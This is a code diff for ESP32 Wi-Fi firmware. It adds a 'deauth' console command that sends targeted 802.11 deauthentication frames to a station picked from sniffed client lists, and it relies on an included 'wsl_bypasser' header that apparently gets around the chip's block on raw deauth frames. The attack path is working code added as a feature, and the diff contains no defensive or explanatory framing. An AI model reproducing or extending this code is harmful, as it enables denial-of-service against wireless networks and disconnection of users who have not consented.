@@ -18,6 +18,7 @@
 #include "wifi.h"
 #include "user_interface.h"
 #include "conf.h"
+#include "wsl_bypasser.h"
 
 #include "lwip/err.h"
 #include "lwip/sockets.h"
@@ -469,10 +470,6 @@ static void wifi_event_handler(void* arg, esp_event_base_t event_base,
         ESP_LOGI(TAG, "Unhandled WIFI event");
     }
 }
-
-//*****************************************************************************
-// Deauth sending
-//*****************************************************************************
 
 //*****************************************************************************
 // General Purpose Timer - We provide this as a quick way for UI and REPL cmds
@@ -986,6 +983,30 @@ static int do_repl_scan_mac_stop(int argc, char** argv)
 }
 
 //*****************************************************************************
+// REPL Deauth STA CMD
+//*****************************************************************************
+
+static int do_deauth(int argc, char** argv)
+{  
+    if(argc != 2)
+    {
+        ESP_LOGE(TAG, "Usage: deauth <mac index>");
+        return 1;
+    }
+
+    if(!pkt_sniffer_running)
+    {
+        ESP_LOGE(TAG, "Please run the pkt sniffer first");
+        return 1;
+    }
+
+    uint8_t i = (uint8_t) strtol(argv[1], NULL,10);
+    wsl_bypasser_send_deauth_frame_targted(ap_info[active_mac_target_ap].bssid, (uint8_t*) &active_mac_list[i]);
+
+    return 0;
+}
+
+//*****************************************************************************
 // UI SCAN AP. Pretty straightforward lcd UI command. On init of this cmd we
 // home the screen, clear it and put an indicator that we are scanning. And 
 // lock the cursor cause we dont want anyone messing around. We then push the
@@ -1408,6 +1429,7 @@ void register_wifi(void)
     register_no_arg_cmd("scan_ap", "Scan for all Wifi APs", &do_repl_scan_ap);
     register_no_arg_cmd("scan_mac_start", "Start a scan of stations on an AP: sta_scan_start <ap_index from scan>", &do_repl_scan_mac_start);
     register_no_arg_cmd("scan_mac_stop", "Stop a scan of stations on an AP", &do_repl_scan_mac_stop);
+    register_no_arg_cmd("deauth", "Send Deauth Pkt to Active while scanner running", &do_deauth);
 }
 
 void ui_add_wifi(void)
